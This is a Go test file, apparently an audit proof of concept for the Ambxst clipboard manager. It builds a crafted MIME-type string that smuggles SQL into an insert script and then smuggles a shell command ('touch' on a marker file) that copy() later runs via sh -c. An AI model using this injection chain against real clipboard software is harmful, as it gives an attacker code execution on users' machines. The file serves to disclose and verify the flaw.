package clipboard

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"ambxst/backend/pkg/paths"
)

const schema = `
CREATE TABLE clipboard_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    content_hash TEXT NOT NULL UNIQUE,
    mime_type TEXT NOT NULL DEFAULT 'text/plain',
    preview TEXT NOT NULL,
    full_content TEXT,
    is_image INTEGER NOT NULL DEFAULT 0,
    binary_path TEXT,
    size INTEGER NOT NULL DEFAULT 0,
    pinned INTEGER NOT NULL DEFAULT 0,
    alias TEXT,
    display_index INTEGER,
    created_at INTEGER NOT NULL,
    updated_at INTEGER NOT NULL
);
`

func scriptPath(t *testing.T, name string) string {
	t.Helper()
	if dir := os.Getenv("POC_SCRIPTS_DIR"); dir != "" {
		return filepath.Join(dir, name)
	}
	for _, cand := range []string{"scripts", filepath.Join("..", "..", "..", "..", "scripts")} {
		p := filepath.Join(cand, name)
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	t.Fatalf("cannot locate %s; set POC_SCRIPTS_DIR to the Ambxst scripts/ directory", name)
	return ""
}

func TestMain(m *testing.M) {
	if os.Getenv("AUDIT_STUB") == "1" {
		switch filepath.Base(os.Args[0]) {
		case "wl-paste":
			if len(os.Args) > 1 && os.Args[1] == "--list-types" {
				fmt.Println(os.Getenv("AUDIT_MIME"))
				os.Exit(0)
			}
			if len(os.Args) > 2 && os.Args[1] == "--type" && os.Args[2] == "text/uri-list" {
				os.Exit(1)
			}
			if len(os.Args) > 1 && os.Args[1] == "--type" {
				os.Stdout.WriteString("fake-png-bytes")
				os.Exit(0)
			}
			os.Exit(0)
		case "wl-copy":
			io.Copy(io.Discard, os.Stdin)
			os.Exit(0)
		}
	}
	os.Exit(m.Run())
}

func runSQL(t *testing.T, db string, sql string) string {
	t.Helper()
	cmd := exec.Command("sqlite3", db)
	cmd.Stdin = strings.NewReader(sql)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("sqlite3: %v: %s", err, out)
	}
	return strings.TrimSpace(string(out))
}

func TestValidateClipboardInjectionChain(t *testing.T) {
	dir := t.TempDir()
	exe, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	stubDir := filepath.Join(dir, "stub")
	if err := os.MkdirAll(stubDir, 0o700); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"wl-paste", "wl-copy"} {
		if err := os.Symlink(exe, filepath.Join(stubDir, name)); err != nil {
			t.Fatal(err)
		}
	}

	dataDir := filepath.Join(dir, "data")
	if err := os.MkdirAll(dataDir, 0o700); err != nil {
		t.Fatal(err)
	}
	db := filepath.Join(dir, "clipboard.db")
	if out := runSQL(t, db, schema); out != "" {
		t.Fatal(out)
	}

	binFile := filepath.Join(dir, "attack.png")
	if err := os.WriteFile(binFile, []byte("attacker image bytes"), 0o600); err != nil {
		t.Fatal(err)
	}
	marker := filepath.Join(dir, "marker")
	mime := fmt.Sprintf(
		"image/png', 'p', 'f', 1, '%s', 9, 0, 0, 0, 0); "+
			"INSERT INTO clipboard_items(content_hash,mime_type,preview,full_content,is_image,binary_path,size,pinned,display_index,created_at,updated_at) "+
			"VALUES('h-audit','image/png'';touch %s;#','p','f',1,'%s',9,0,0,0,0); --",
		binFile, marker, binFile)

	checkSh := filepath.Join(dir, "clipboard_check.sh")
	insertSh := filepath.Join(dir, "clipboard_insert.sh")
	for _, src := range []string{"clipboard_check.sh", "clipboard_insert.sh"} {
		b, err := os.ReadFile(scriptPath(t, src))
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, src), b, 0o700); err != nil {
			t.Fatal(err)
		}
	}

	t.Setenv("PATH", stubDir+":/usr/bin:/bin")
	t.Setenv("AUDIT_STUB", "1")
	t.Setenv("AUDIT_MIME", mime)

	_ = exec.Command("bash", checkSh, db, insertSh, dataDir).Run()

	if got := runSQL(t, db, "SELECT count(*) FROM clipboard_items WHERE content_hash='h-audit';"); got != "1" {
		t.Fatalf("attacker row absent; SQL injection at insert not reproduced (got %q)", got)
	}
	t.Log("step 1 CONFIRMED: a clipboard image offer with crafted MIME executed attacker SQL in clipboard_insert.sh (arbitrary write into clipboard.db, no user interaction)")

	idStr := runSQL(t, db, "SELECT id FROM clipboard_items WHERE content_hash='h-audit';")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		t.Fatal(err)
	}
	params, err := json.Marshal(map[string]int64{"id": id})
	if err != nil {
		t.Fatal(err)
	}
	svc := NewService(&paths.Paths{DataDir: dir})
	if _, err := svc.copy(params); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatalf("command-injection marker was not created: %v", err)
	}
	t.Log("step 2 CONFIRMED: re-copying that item ran attacker shell via copy()'s sh -c on the stored MIME. Only wl-paste and wl-copy were stubs, while sqlite3 and both scripts ran real")
}
